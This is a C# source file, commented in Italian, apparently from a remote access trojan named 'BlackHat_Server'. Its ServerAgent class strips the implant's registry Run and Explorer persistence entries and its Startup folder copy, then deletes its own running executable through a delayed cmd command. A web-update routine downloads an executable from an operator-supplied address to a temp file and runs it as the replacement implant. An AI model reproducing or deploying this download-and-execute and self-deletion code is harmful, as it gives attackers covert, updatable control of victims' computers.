using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace BlackHat_Server
{
    internal class ServerAgent
    {
        /// <summary>
        ///     Disinstalla il server
        ///     onlyDelete: se true è solo disinstallzione, altrimenti non elimina se stesso (uso per update from web)
        /// </summary>
        public void UninstallServer(bool onlyDelete)
        {
            var rm = new RegistryManager();

            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var adppDataFilePath = Path.Combine(appData, ST_Client.Instance.sAppDataInstall);


            // ELIMINO I REGISTRY DELLE INSTALLAZIONi
            if (ST_Client.Instance.bUseHKCU)
                rm.RemoveHKCUReg(ST_Client.Instance.sHKCUEntry, adppDataFilePath);

            if (ST_Client.Instance.bUseExplorer)
                rm.RemoveExplorerReg(ST_Client.Instance.sExplorerEntry, adppDataFilePath);

            // ELIMINAZIONE FILE
            if (ST_Client.Instance.bUseHKCU || ST_Client.Instance.bUseExplorer)
                if (File.Exists(adppDataFilePath) && Application.ExecutablePath != adppDataFilePath)
                    File.Delete(adppDataFilePath);


            if (ST_Client.Instance.bUseStartupFolder)
            {
                var startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                var fileToDel = Path.Combine(startup, ST_Client.Instance.sStartupFileName);

                if (File.Exists(fileToDel) && Application.ExecutablePath != fileToDel)
                    File.Delete(fileToDel);
            }


            // NUOVO PROCESSO CMD PER ELIMINAZIONE DEL FILE IN ESECUZIONE!

            if (onlyDelete)
            {
                var ic = new InstallClass();
                ic.DeleteMySelf();
            }

            // L'APP è STATA CHIUSA DA DELETEMYSELF
        }
        //--------------------------

        /// <summary>
        ///     Avvio thread di update server
        /// </summary>
        /// <param name="webAddress"></param>
        public void StartUpdateServerWeb(string webAddress)
        {
            new Thread(delegate() { ServerWebUpdater(webAddress); }).Start();
        }
        //---------------------------

        /// <summary>
        ///     Thread di update server da web
        /// </summary>
        /// <param name="webAddress"></param>
        private void ServerWebUpdater(string webAddress)
        {
            try
            {
                var tmpFilePath = Path.GetTempFileName();

                tmpFilePath = Path.ChangeExtension(tmpFilePath, ".exe"); // lo faccio diventare un exe


                var wc = new WebClient();
                wc.DownloadFile(webAddress, tmpFilePath); // scarico il file nel tmp

                UninstallServer(false); // CANCELLO TUTTA L'INSTALLAZIONE MA NON L'ESEGUIBILE

                // SOSTITUISCO L'ESEGUIBILE E MI RIESEGUO!

                var arg = string.Format("/C choice /C Y /N /D Y /T 9 & Del \"{0}\" & \"{1}\"  ",
                    Application.ExecutablePath, tmpFilePath);

                var dr = new DosRunner();

                dr.RunDosSelfDelete(arg);


                Application.Exit();
            }
            catch
            {
            }
        }
        //-------------------------
    }
}